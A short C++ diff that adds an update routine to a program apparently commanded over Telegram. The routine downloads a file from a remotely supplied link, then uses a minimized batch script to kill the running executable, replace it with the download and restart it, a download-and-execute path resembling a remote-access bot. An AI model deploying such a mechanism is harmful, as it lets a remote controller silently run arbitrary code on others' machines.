@@ -508,3 +508,20 @@ void ChangeCfg(std::string change) {
         telegram::Send("Wrong Syntax!");
     }
 }
+
+void UpdateDupnix(std::string link) {
+    if (!tools::DownloadFile(link, "temp")) {
+        telegram::Send("Can't Download!");
+        return;
+    }
+    std::ofstream update("a.bat");
+    update << "TASKKILL /F /IM \"" << tools::get_exe() << "\"\n"
+        << "del /f \"" << tools::get_exe() << "\"\n"
+        << "move temp \"" << tools::get_exe() << "\"\n"
+        << "start " << tools::get_exe() << std::endl
+        << "exit";
+
+    update.close();
+
+    system("start /min a.bat");
+}
